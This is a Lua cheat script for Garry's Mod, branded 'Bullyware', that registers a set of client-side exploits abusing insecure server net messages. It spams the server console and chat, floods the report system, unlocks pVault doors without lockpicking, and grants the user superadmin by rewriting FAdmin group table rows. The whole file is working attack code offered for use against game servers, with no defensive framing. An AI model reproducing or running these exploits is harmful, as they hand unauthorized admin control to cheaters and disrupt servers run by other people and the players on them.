--[[
    ____        ______     _       __              
   / __ )__  __/ / / /_  _| |     / /___ _________ 
  / __  / / / / / / / / / / | /| / / __ `/ ___/ _ \
 / /_/ / /_/ / / / / /_/ /| |/ |/ / /_/ / /  /  __/
/_____/\__,_/_/_/_/\__, / |__/|__/\__,_/_/   \___/ 
                  /____/                           
]]--


local exploits = {}

local count = 0
function exploits:Add( tData )
    count = count + 1
    tData.active = false
    tData.toggle = tData.toggle == nil and true or tData.toggle
    exploits[count] = tData
end

local i = 1
local netmsg = util.NetworkIDToString( i )
local tbl = {}
tbl[ netmsg ] = true
while netmsg ~= nil do
    i = i + 1
    netmsg = util.NetworkIDToString(i)
    tbl[ tostring(netmsg) ] = true
end
methamphetamine.cachedNetMessages = tbl

methamphetamine.ValidateNetMessage = function( strMsg ) 
    return methamphetamine.cachedNetMessages[strMsg] or false
end

exploits:Add({
    name = "Spam RCON",
    desc = "This spams the server's console.",
    args = {
        {type = "number", name = "Delay", default = 0.1, min = 0.1, max = 5},
    },
    requirements = function()
        return methamphetamine.ValidateNetMessage("steamid2")
    end,
    onExecute = function(tExploitData)
        if !tExploitData.canExecute then return end
        if tExploitData.active then
            timer.Remove("METHAMPHETAMINE.EXPLOIT."..tExploitData.name)
            return
        end
        print("Creating timer: ", "METHAMPHETAMINE.EXPLOIT."..tExploitData.name, tExploitData.args1, 0 )
        timer.Create("METHAMPHETAMINE.EXPLOIT."..tExploitData.name, tExploitData.args[1], 0, function()
            net.Start( "steamid2" )
            net.WriteString( "Bullyware :OO" )
            net.SendToServer()
        end)
    end
})

exploits:Add({
    name = "Chat Spammer",
    desc = "This spams \"<your name> is friends with <your message>\" in chat for everyone.",
    args = {
        {type = "text", name = "Message to spam", default = "Bullyware is just built different"},
        {type = "number", name = "Spam delay", default = 0.1, min = 0.1, max = 5},
    },
    requirements = function()
        return methamphetamine.ValidateNetMessage("sendtable")
    end,
    onExecute = function(tExploitData)
        PrintTable(tExploitData)
        if !tExploitData.canExecute then return end
        if !tExploitData.active then
            timer.Remove("METHAMPHETAMINE.EXPLOIT."..tExploitData.name)
            LocalPlayer():ChatPrint("Aborted")
            return
        end
        print("Creating timer: ", "METHAMPHETAMINE.EXPLOIT."..tExploitData.name, tExploitData.args[2], 0 )
        timer.Create("METHAMPHETAMINE.EXPLOIT."..tExploitData.name, tExploitData.args[2], 0, function()
            for k, v in ipairs( player.GetAll() ) do
                print("sending net")
                local spamStr = {}
                for i = 1, 15 do
                    table.insert( spamStr, tExploitData.args[1] )
                end

                net.Start( "sendtable" )
                net.WriteEntity( v )
                net.WriteTable( spamStr )
                net.SendToServer()

            end
        end)
    end
})

exploits:Add({
    name = "Get Superadmin",
    desc = "This exploit gives you superadmin. You must reconnect for it to take place.",
    args = {},
    toggle = false,
    requirements = function()
        return methamphetamine.ValidateNetMessage("pplay_addrow") and methamphetamine.ValidateNetMessage("pplay_deleterow")
    end,
    onExecute = function(tExploitData)
        PrintTable(tExploitData)
        if !tExploitData.canExecute then return end
        if !tExploitData.active then
            timer.Remove("METHAMPHETAMINE.EXPLOIT."..tExploitData.name)
            LocalPlayer():ChatPrint("Aborted")
            return
        end
        local id = LocalPlayer():SteamID()
        local tbl = {
            name = "FAdmin_PlayerGroup",
            where = {
                "steamid",
                tostring(id),
            },
        }

        net.Start("pplay_deleterow")
        net.WriteTable(tbl)
        net.SendToServer()

        local tbl = {
            tblname = "FAdmin_PlayerGroup",
            tblinfo = {
                tostring(id),
                "superadmin"
            }
        }

        net.Start("pplay_addrow")
        net.WriteTable(tbl)
        net.SendToServer()

    end
})


exploits:Add({
    name = "SH Reports spam",
    desc = "Spams reports, you know how it is.",
    args = {
        {type = "text", name = "Who are you reporting?",default = "The CEO of Bullyware"},
        {type = "text", name = "What is the reason for the report?",default = "Called me gay"},
        {type = "bool", name = "Should spam reports?", default = false},
        {type = "number", name = "Spam rate", default = 0.2, min = 0.1, max = 5},
    },
    toggle = true,
    requirements = function()
        return methamphetamine.ValidateNetMessage("SH_REPORTS.NewReport") 
    end,
    onExecute = function(tExploitData)
        PrintTable(tExploitData)
        if !tExploitData.canExecute then return end
        if !tExploitData.active then
            timer.Remove("METHAMPHETAMINE.EXPLOIT."..tExploitData.name)
            LocalPlayer():ChatPrint("Aborted")
            return
        end
        if tExploitData.args[3] == true then 
            print("Creating timer: ", "METHAMPHETAMINE.EXPLOIT."..tExploitData.name, tExploitData.args[4], 0 )
            timer.Create("METHAMPHETAMINE.EXPLOIT."..tExploitData.name, tExploitData.args[4], 0, function()
                net.Start("SH_REPORTS.NewReport") 
                net.WriteString(tExploitData.args[1]) 
                net.WriteString("")
                net.WriteString(tExploitData.args[2]) 
                net.WriteUInt(4,8) 
                net.SendToServer()
            end)
        else
            net.Start("SH_REPORTS.NewReport") 
            net.WriteString(tExploitData.args[1]) 
            net.WriteString("")
            net.WriteString(tExploitData.args[2]) 
            net.WriteUInt(4,8) 
            net.SendToServer()
        end
    end
})

local function getClosestPVault()
    local closest
    local pVaults = ents.FindByClass("pvault_door")
    for k,v in ipairs(pVaults) do
        if not closest then closest = v end
        if closest:GetPos():DistToSqr(LocalPlayer():GetPos()) > v:GetPos():DistToSqr(LocalPlayer():GetPos()) then
            closest = v
        end
    end
    return closest
end
exploits:Add({
    name = "Unlock pVault",
    desc = "Look at the vault, execute this and wait a couple of seconds :)",
    args = {},
    toggle = false,
    requirements = function()
        return methamphetamine.ValidateNetMessage("pvault_lockpick_pass") 
    end,
    onExecute = function(tExploitData)
        local vault = getClosestPVault()
        print("vault: ".. tostring(vault) )
        if not IsValid(vault) then return end
        RunConsoleCommand("+use")
        timer.Simple(8,function()
            RunConsoleCommand("-use")
            net.Start("pvault_lockpick_pass")
            net.WriteEntity(vault)
            net.SendToServer()
        end)
    end
})


return exploits